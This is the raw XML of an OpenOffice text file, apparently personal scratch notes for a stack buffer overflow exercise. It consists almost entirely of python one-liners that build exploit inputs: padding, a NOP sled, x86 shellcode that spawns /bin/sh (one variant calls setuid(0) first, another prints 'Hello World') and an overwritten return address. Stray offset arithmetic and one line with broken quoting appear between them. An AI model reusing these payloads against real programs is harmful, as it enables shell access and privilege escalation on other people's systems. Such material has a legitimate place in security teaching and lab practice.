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 `python -c "print 600*'A'+336*'\x90'+'\x31\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x93\xf6\x45\xb7\x83\xeb\xfc\xe2\xf4\xa2\x2d\x16\xf4\xc0\x9c\x47\xdd\xf5\xae\xcc\x56\x5e\x76\xd6\xee\x23\xc9\x88\x37\xda\x8f\xbc\xec\xc9\x9e\xd0\x32\x8a\xae\x23\xdf\xb4\xf9\x06\xd1\xc0\x7f\xa4\x07\xf5\xa6\x14\xe4\x1a\x17\x06\x7a\x13\xa4\x2d\x98\xbc\x85\x2d\xdf\xbc\x94\x2c\xd9\x1a\x15\x17\xe4\x1a\x17\xf5\xbc\x5e\x76\x45\xb7'+'\xe8\xe2\xff\xff\xff\x7f'"`</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">run `python -c "print 644*'A'+336*'\x90'+'\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\xe8\xe2\xff\xff\xff\x7f'"`</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">46x + 7</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="2"/>\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh;</text:p>
      <text:p text:style-name="Standard">38 + 7</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">run `python -c "print 652*'A'+336*'\x90'+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\xe8\xe2\xff\xff\xff\x7f'"`</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">run `python -c "print 653*'A'+336*'\x90'+''\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\xeb\x05\x59\xb2\x01<text:line-break/>\xcd\x80\xe8\xf6\xff\xff\xffHello World !'+\xe8\xe2\xff\xff\xff\x7f'"`</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">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09:40:27</meta:creation-date>
    <dc:date>2010-04-26T16:20:14</dc:date>
    <meta:editing-duration>PT03H04M51S</meta:editing-duration>
    <meta:editing-cycles>9</meta:editing-cycles>
    <meta:generator>OpenOffice.org/3.1$Unix OpenOffice.org_project/310m21$Build-9319</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="8" meta:word-count="31" meta:character-count="1309"/>
  </office:meta>
</office:document-meta>
</file>